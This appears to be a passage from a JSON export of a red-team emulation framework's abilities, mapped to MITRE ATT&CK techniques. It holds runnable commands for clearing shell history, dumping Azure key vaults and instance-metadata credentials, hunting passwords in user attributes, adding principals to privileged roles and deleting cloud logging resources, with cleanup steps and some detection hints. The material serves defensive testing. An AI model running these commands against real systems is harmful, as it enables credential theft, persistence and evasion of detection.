"0c7c18db582bff4d0da4b4f8fdb2be49", "technique_id": "T1119", "tactic": "collection", "requirements": [], "name": "Automated Collection PowerShell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Stop terminal from logging history", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "> $HOME/.bash_history && unset HISTFILE", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.acrn", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "no.logs"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.acrn", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "no.logs"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Clear-History;Clear", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Clear Command History", "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a", "technique_id": "T1070.003", "tactic": "defense-evasion", "requirements": [{"relationship_match": [{"source": "root"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Avoid logs", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Upon successful execution of this test, the names, locations, and contents of key vaults within an Azure account will be output to a file.\nSee - https://www.netspi.com/blog/technical/cloud-penetration-testing/a-beginners-guide-to-gathering-azure-passwords/", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["remove-item $env:temp\\T1528Test1.txt -force -erroraction silentlycontinue"], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "import-module \"$env:temp\\Get-AzurePasswords.ps1\"; $Password = ConvertTo-SecureString -String \"T1082Az\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"None\", $Password; Connect-AzureRmAccount -Credential $Credential; Get-AzurePasswords -subscription 'None' > $env:temp\\T1528Test1.txt; cat $env:temp\\T1528Test1.txt", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Steal Application Access Token", "ability_id": "ac51003d352df853d49a28ca5a4311f9", "technique_id": "T1528", "tactic": "credential-access", "requirements": [], "name": "Azure - Dump All Azure Key Vaults with Microburst", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test invokes a web request to the default Instance Metadata API of 169.254.169.254 in order to dump the data contained within it to a file. \nSee: https://www.sans.org/blog/cloud-instance-metadata-services-imds-/\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["remove-item $env:temp\\T1552.005Test2.txt -force -erroraction silentlycontinue"], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "Invoke-RestMethod -Headers @{\"Metadata\"=\"true\"} -Method GET -Uri \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\" | ConvertTo-Json -Depth 64 > $env:temp\\T1552.005Test2.txt", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Unsecured Credentials: Cloud Instance Metadata API", "ability_id": "315440f0fd42ea0129065a76d89184f1", "technique_id": "T1552.005", "tactic": "credential-access", "requirements": [], "name": "Azure - Dump Azure Instance Metadata from Virtual Machines", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Upon successful execution, this test will enumerate all resources that are contained within a valid Azure subscription. \nThe resources enumerated will display on screen, as well as several csv files and folders will be output to a specified directory, listing what resources were discovered by the script. \nSee https://dev.to/cheahengsoon/enumerating-subscription-information-with-microburst-35a1\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["remove-item $env:temp\\T1526Test1 -recurse -force -erroraction silentlycontinue"], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "import-module \"$env:temp\\Get-AzDomainInfo.ps1\"; $Password = ConvertTo-SecureString -String \"T1082Az\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"None\", $Password; Connect-AzAccount -Credential $Credential | out-null; Get-AzDomainInfo -folder $env:temp\\T1526Test1 -subscription \"None\" -verbose", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Cloud Service Discovery", "ability_id": "0cb4473bdec66e428f811235aff1b620", "technique_id": "T1526", "tactic": "discovery", "requirements": [], "name": "Azure - Dump Subscription Data with MicroBurst", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Upon successful execution, this test will utilize a wordlist to enumerate the public facing containers and blobs of a specified Azure storage account. \nSee https://www.netspi.com/blog/technical/cloud-penetration-testing/anonymously-enumerating-azure-file-resources/ . \n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["remove-item $env:temp\\T1530Test1.txt -erroraction silentlycontinue"], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "import-module \"$env:temp\\Invoke-EnumerateAzureBlobs.ps1\"; Invoke-EnumerateAzureBlobs -base secure -permutations $env:temp\\permutations.txt -outputfile \"$env:temp\\T1530Test1.txt\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Data from Cloud Storage Object", "ability_id": "a9c2711492ba2c44d1ef3194a0ee138b", "technique_id": "T1530", "tactic": "collection", "requirements": [], "name": "Azure - Enumerate Azure Blobs with MicroBurst", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identifies an Event Hub deletion in Azure.\nAn Event Hub is an event processing service that ingests and processes large volumes of events and data.\nAn adversary may delete an Event Hub in an attempt to evade detection.\nhttps://docs.microsoft.com/en-us/azure/event-hubs/event-hubs-about.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["cd $PathToAtomicsFolder/T1562.008/src/T1562.008-2/; terraform destroy -auto-approve"], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd; Connect-AzureAD -Credential $creds; Remove-AzEventHub -ResourceGroupName", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable Cloud Logs", "ability_id": "5eec8bf22546e9b98fb21d5af305797c", "technique_id": "T1562.008", "tactic": "defense-evasion", "requirements": [], "name": "Azure - Eventhub Deletion", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Upon successful execution, this test will test for anonymous access to Azure storage containers by invoking a web request and outputting the results to a file. \nThe corresponding response could then be interpreted to determine whether or not the resource/container exists, as well as other information. \nSee https://ninocrudele.com/the-three-most-effective-and-dangerous-cyberattacks-to-azure-and-countermeasures-part-2-attack-the-azure-storage-service     \n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["remove-item $env:temp\\T1530Test2.txt -erroraction silentlycontinue"], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "try{$response = invoke-webrequest \"https://T1530Test2.blob.core.windows.net/None/None\" -method \"GET\"}; catch [system.net.webexception]; {if($_.Exception.Response -ne $null); {$Response = $_.Exception.Response.GetResponseStream(); $ReadResponse = New-Object System.IO.StreamReader($Response); $ReadResponse.BaseStream.Position = 0; $responseBody = $ReadResponse.ReadToEnd()}; else {$responseBody = \"The storage account could not be anonymously accessed.\"}}; \"Response received for T1530Test2.blob.core.windows.net/None/None: $responsebody\" | out-file -filepath $env:temp\\T1530Test2.txt -append", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Data from Cloud Storage Object", "ability_id": "6f408258cabdeda38f81cfdc239fb6c0", "technique_id": "T1530", "tactic": "collection", "requirements": [], "name": "Azure - Scan for Anonymous Access to Azure Storage (Powershell)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test uses the MSOnline Powershell module to retrieve all user attributes for a specified account, which can sometimes contain unsecured credentials. \nUpon successful execution, this test will scan all user attributes for any strings containing \"password\".\nThose unsecured credentials will be output to a text file, as well as the account that they are associated with and the user attribute in which they were found. \nSee: https://github.com/dafthack/CloudPentestCheatsheets/blob/master/cheatsheets/Azure.md\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["remove-item $env:temp\\T1552.005Test1.txt -force -erroraction silentlycontinue"], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "import-module msonline; $Password = ConvertTo-SecureString -String \"T1082Az\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"None\", $Password; Connect-MsolService -Credential $Credential; $users = Get-MsolUser -All; foreach($user in $users); {$props = @();$user | Get-Member | foreach-object{$props+=$_.Name}; foreach($prop in $props); {if($user.$prop -like \"*password*\"); {(\"[*]\" + $user.UserPrincipalName + \"[\" + $prop + \"]\" + \" : \" + $user.$prop) | out-file -filepath $env:temp\\T1552.005Test1.txt -append -force}}}; get-content -path $env:temp\\T1552.005Test1.txt -erroraction silentlycontinue", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Unsecured Credentials: Cloud Instance Metadata API", "ability_id": "d27398e945aa13a0812450cd48815572", "technique_id": "T1552.005", "tactic": "credential-access", "requirements": [], "name": "Azure - Search Azure AD User Attributes for Passwords", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The adversaries want to add service principal to some Azure role, also called Azure resource role. Threat actor \nmay be interested primarily in highly privileged roles, e.g. Owner, Contributor.\nBy default, the role Reader is assigned to service principal in this test.\n\nNew-AzRoleAssignment cmdlet could be also use to assign user/service principal to resource, resource group and management group.\n\nThe account you use to run the PowerShell command must have Microsoft.Authorization/roleAssignments/write \n(e.g. such as User Access Administrator or Owner) and the Azure Active Directory Graph Directory.Read.All \nand Microsoft Graph Directory.Read.All permissions.\n\nDetection hint - check Operation Name \"Create role assignment\" in subscriptions Activity Logs.\n", "repeatable": false, "privilege": "", "buckets": ["persistence"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Import-Module -Name AzureAD -ErrorAction Ignore; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzAccount -Credential $Credential -ErrorAction Ignore; $sp = Get-AzADServicePrincipal | where-object {$_.DisplayName -eq \"SuperSP\"}; if ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }; $subscription = Get-AzSubscription | where-object {$_.Name -eq \"Azure subscription 1\"} ; if ($subscription -eq $null) { Write-Warning \"Subscription not found\"; exit }; $role = Get-AzRoleDefinition | where-object {$_.Name -eq \"Reader\"}; if ($role -eq $null) { Write-Warning \"Role not found\"; exit }; Remove-AzRoleAssignment -ObjectId $sp.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription; Write-Host \"Service Principal $($sp.DisplayName) was removed from $($role.Name) role in subscriptions $($subscriptions.Name)\""], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "try {if (Get-InstalledModule -Name Az.Resources -ErrorAction SilentlyContinue) { ; } else {Install-Module -Name Az.Resources -Force};  ;  Import-Module -Name Az.Resources; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzAccount -Credential $Credential; $sp = Get-AzADServicePrincipal | where-object {$_.DisplayName -eq \"SuperSP\"}; if ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }; $subscription = Get-AzSubscription | where-object {$_.Name -eq \"Azure subscription 1\"} ; if ($subscription -eq $null) { Write-Warning \"Subscription not found\"; exit }; $role = Get-AzRoleDefinition | where-object {$_.Name -eq \"Reader\"}; if ($role -eq $null) { Write-Warning \"Role not found\"; exit }; New-AzRoleAssignment -ObjectId $sp.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription; Write-Host \"Service Principal $($sp.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Account Manipulation", "ability_id": "bac18f187778e4202196ddd3c6041d31", "technique_id": "T1098", "tactic": "persistence", "requirements": [], "name": "Azure - adding service principal to Azure role in subscription", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The adversaries want to add user to some Azure role, also called Azure resource role. Threat actor \nmay be interested primarily in highly privileged roles, e.g. Owner, Contributor.\nBy default, the role Reader is assigned to user in this test.\n\nNew-AzRoleAssignment cmdlet could be also use to assign user/service principal to resource, resource group and management group.\n\nThe account you use to run the PowerShell command must have Microsoft.Authorization/roleAssignments/write \n(e.g. such as User Access Administrator or Owner) and the Azure Active Directory Graph Directory.Read.All \nand Microsoft Graph Directory.Read.All permissions.\n\nDetection hint - check Operation Name \"Create role assignment\" in subscriptions Activity Logs.\n", "repeatable": false, "privilege": "", "buckets": ["persistence"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Import-Module -Name AzureAD -ErrorAction Ignore; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzAccount -Credential $Credential -ErrorAction Ignore; $user = Get-AzADUser | where-object {$_.DisplayName -eq \"SuperUser\" -or $_.UserPrincipalName -eq \"SuperUser\" }; if ($user -eq $null) { Write-Warning \"User not found\"; exit }; $subscription = Get-AzSubscription | where-object {$_.Name -eq \"Azure subscription 1\"}; if ($subscription -eq $null) { Write-Warning \"Subscription not found\"; exit }; $role = Get-AzRoleDefinition | where-object {$_.Name -eq \"Reader\"}; if ($role -eq $null) { Write-Warning \"Role not found\"; exit }; Remove-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription; Write-Host \"User Principal $($sp.DisplayName) was removed from $($role.Name) role in subscriptions $($subscriptions.Name)\""], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "try {if (Get-InstalledModule -Name Az.Resources -ErrorAction SilentlyContinue) { ; } else {Install-Module -Name Az.Resources -Force};  ;  Import-Module -Name Az.Resources; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzAccount -Credential $Credential; $user = Get-AzADUser | where-object {$_.DisplayName -eq \"SuperUser\" -or $_.UserPrincipalName -eq \"SuperUser\" }; if ($user -eq $null) { Write-Warning \"User not found\"; exit }; $subscription = Get-AzSubscription | where-object {$_.Name -eq \"Azure subscription 1\"}; if ($subscription -eq $null) { Write-Warning \"Subscription not found\"; exit }; $role = Get-AzRoleDefinition | where-object {$_.Name -eq \"Reader\"}; if ($role -eq $null) { Write-Warning \"Role not found\"; exit }; New-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription; Write-Host \"User $($user.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Account Manipulation", "ability_id": "cbf44e79b4bef7b2e997508f759beee3", "technique_id": "T1098", "tactic": "persistence", "requirements": [], "name": "Azure - adding user to Azure role in subscription", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creates a new user in Azure AD. Upon successful creation, a new user will be created. Adversaries create new users so that their malicious activity does not interrupt the normal functions of the compromised users and can remain undetected for a long time.", "repeatable": false, "privilege": "", "buckets": ["persistence"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-AzureADUser -ObjectId \"atomicredteam@yourdomain.com\""], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "Connect-AzureAD; $userprincipalname = \"atomicredteam@yourdomain.com\"; $username = \"atomicredteam\"      ; $password = \"reallylongcredential12345ART-ydsfghsdgfhsdgfhgsdhfg\"; $PasswordProfile = New-Object -TypeName Microsoft.Open.AzureAD.Model.PasswordProfile; $PasswordProfile.Password = $password; New-AzureADUser -DisplayName $username -PasswordProfile $PasswordProfile -UserPrincipalName $userprincipalname -AccountEnabled $true -MailNickName $username", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Create Account: Cloud Account", "ability_id": "9e574834e67fa35067bd562c8f288d52", "technique_id": "T1136.003", "tactic": "persistence", "requirements": [], "name": "Azure AD - Create a new user", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creates a new user in Azure AD via the Azure CLI. Upon successful creation, a new user will be created. Adversaries create new users so that their malicious activity does not interrupt the normal functions of the compromised users and can remain undetected for a long time.", "repeatable": false, "privilege": "", "buckets": ["persistence"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["az ad user delete --id"], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "az login; $userprincipalname = \"atomicredteam@yourdomain.com\"; $username = \"atomicredteam\"      ; $password = \"reallylongcredential12345ART-ydsfghsdgfhsdgfhgsdhfg\"; az ad user create --display-name $username --password $password --user-principal-name $userprincipalname; az ad user list --filter \"displayname eq 'atomicredteam'\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Create Account: Cloud Account", "ability_id": "98ca669d1338903366599fc67dfa4a33", "technique_id": "T1136.003", "tactic": "persistence", "requirements": [], "name": "Azure AD - Create a new user via Azure CLI", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Deletes a user in Azure AD. Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (excluding changed credentials) to remove access to accounts.", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["N/A"], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "Connect-AzureAD; $userprincipalname = \"atomicredteam@yourdomain.com\"; Remove-AzureADUser -ObjectId $userprincipalname", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Account Access Removal", "ability_id": "9b0bad4f1a4dba7cec8e37874f405909", "technique_id": "T1531", "tactic": "impact", "requirements": [], "name": "Azure AD - Delete user via Azure AD PowerShell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Deletes a user in Azure AD. Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (excluding changed credentials) to remove access to accounts.", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["N/A"], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "az login; $userprincipalname = \"atomicredteam@yourdomain.com\"; az ad user delete --id $userprincipalname", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Account Access Removal", "ability_id": "06de3d7d7c037b45d58dfafcdfecfdd6", "technique_id": "T1531", "tactic": "impact", "requirements": [], "name": "Azure AD - Delete user via Azure CLI", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The adversaries want to add permission to newly created application. Application could be then used for persistence or for further operation in the attacked infrastructure. Permissions like AppRoleAssignment.ReadWrite.All or RoleManagement.ReadWrite.Directory in particular can be a valuable target for a threat actor.\nThis technique will create a new app, with the provided name, and give it the provided permission. But if you prefer to add credentials to an existing app, replace in the code: \"Get-AzureADApplication\" instead of \"New-AzureADServicePrincipal\".\nThe DirectoryRecommendations.Read.All permissions has been selected as the default.\n\nThe account you use to run the PowerShell command should have Global Administrator/Application Administrator/Cloud Application Administrator role in your Azure AD.\n\nDetection hint - check Operation Name \"Add app role assignment to service principal\" in subscriptions Activity Logs.\nYou can also take a look at the materials:\nhttps://learnsentinel.blog/2022/01/04/azuread-privesc-sentinel/\nhttps://github.com/reprise99/Sentinel-Queries\nhttps://docs.google.com/presentation/d/1AWx1w0Xcq8ENvOmSjAJswEgEio-il09QWZlGg9PbHqE/edit#slide=id.g10460eb209c_0_2766\nhttps://gist.github.com/andyrobbins/7c3dd62e6ed8678c97df9565ff3523fb\n", "repeatable": false, "privilege": "", "buckets": ["persistence"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Import-Module -Name AzureAD; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzureAD -Credential $Credential; $aadApplication = @(Get-AzureADApplication -Filter \"DisplayName eq 'test_app'\"); If ($aadApplication.Count -eq 0); {;   Write-Host \"App not found: cannot delete it\";   exit; }; ElseIf ($aadApplication.Count -gt 1); {;   Write-Host \"Found several app with name 'test_app': one is likely the one this technique created, but as a precaution, none will be deleted. Manual cleanup is required.\";   exit; }; Else; {;   Remove-AzureADApplication -ObjectId $aadApplication[0].ObjectId;   Write-Host \"Successfully deleted app\"; }"], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) { ; } else {Install-Module -Name AzureAD -Force};  ;  Import-Module -Name AzureAD; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzureAD -Credential $Credential; $aadApplication = New-AzureADApplication -DisplayName \"test_app\"; $servicePrincipal = New-AzureADServicePrincipal -AppId $aadApplication.AppId; $graphSP = Get-AzureADServicePrincipal -Filter \"DisplayName eq 'Microsoft Graph'\"; $requiredGraphAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess; $requiredGraphAccess.ResourceAppId = $graphSP.AppId; $requiredGraphAccess.ResourceAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.ResourceAccess]; $ApplicationPermissions = @('DirectoryRecommendations.Read.All'); $reqPermission = $graphSP.AppRoles | Where-Object {$_.Value -eq $ApplicationPermissions}; if($reqPermission); {; $resourceAccess = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess; $resourceAccess.Type = \"Role\"; $resourceAccess.Id = $reqPermission.Id    ; $requiredGraphAccess.ResourceAccess.Add($resourceAccess); }; else; {; Write-Host \"App permission $permission not found in the Graph Resource API\" -ForegroundColor Red; }; $requiredResourcesAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.RequiredResourceAccess]; $requiredResourcesAccess.Add($requiredGraphAccess); Set-AzureADApplication -ObjectId $aadApplication.ObjectId -RequiredResourceAccess $requiredResourcesAccess; $servicePrincipal = Get-AzureADServicePrincipal -Filter \"AppId eq '$($aadApplication.AppId)'\"; New-AzureADServiceAppRoleAssignment -ObjectId $servicePrincipal.ObjectId -PrincipalId $servicePrincipal.ObjectId -ResourceId $graphSP.ObjectId -Id $reqPermission.Id", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Account Manipulation", "ability_id": "80d22fb154cc39b34d920f0855ce746e", "technique_id": "T1098", "tactic": "persistence", "requirements": [], "name": "Azure AD - adding permission to application", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The adversaries want to add service principal to some Azure AD role. Threat actor \nmay be interested primarily in highly privileged roles, e.g. Global Administrator, Application Administrator, \nPrivileged Authentication Administrator (this role can reset Global Administrator password!).\nBy default, the role Global Reader is assigned to service principal in this test.\n\nThe account you use to run the PowerShell command should have Privileged Role Administrator or Global Administrator role in your Azure AD.\n\nDetection hint - check Activity \"Add member to role\" in Azure AD Audit Logs. In targer you will also see Service Principal as a type.\n", "repeatable": false, "privilege": "", "buckets": ["persistence"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Import-Module -Name AzureAD -ErrorAction Ignore; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzureAD -Credential $Credential -ErrorAction Ignore; $sp = Get-AzureADServicePrincipal -Filter \"DisplayName eq 'SuperSP'\"; if ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }; $role = Get-AzureADDirectoryRole -Filter \"DisplayName eq 'Global Reader'\"; if ($role -eq $null) { Write-Warning \"Role not found\"; exit }; Remove-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -MemberId $sp.ObjectId; Write-Host \"Service Principal $($sp.DisplayName) was removed from $($role.DisplayName) role\""], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) { ; } else {Install-Module -Name AzureAD -Force};  ;  Import-Module -Name AzureAD; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzureAD -Credential $Credential; $sp = Get-AzureADServicePrincipal -Filter \"DisplayName eq 'SuperSP'\"; if ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }; $role = Get-AzureADDirectoryRole -Filter \"DisplayName eq 'Global Reader'\"; if ($role -eq $null) { Write-Warning \"Role not found\"; exit }; Add-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $sp.ObjectId; Write-Host \"Service Principal $($sp.DisplayName) was added to $($role.DisplayName)\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Account Manipulation", "ability_id": "c736f0cee0c30c06095fedc05fa83912", "technique_id": "T1098", "tactic": "persistence", "requirements": [], "name": "Azure AD - adding service principal to Azure AD role", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The adversaries want to add user to some Azure AD role. Threat actor \nmay be interested primarily in highly privileged roles, e.g. Global Administrator, Application Administrator, \nPrivileged Authentication Administrator (this role can reset Global Administrator password!).\nBy default, the role Global Reader is assigned to the user principal in this test.\n\nThe account you use to run the PowerShell command should have Privileged Role Administrator or Global Administrator role in your Azure AD.\n\nDetection hint - check Activity \"Add member to role\" in Azure AD Audit Logs. In targer you will also see User as a type.\n", "repeatable": false, "privilege": "", "buckets": ["persistence"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Import-Module -Name AzureAD -ErrorAction Ignore; $PWord = ConvertTo-SecureString -String \"p4sswd\" 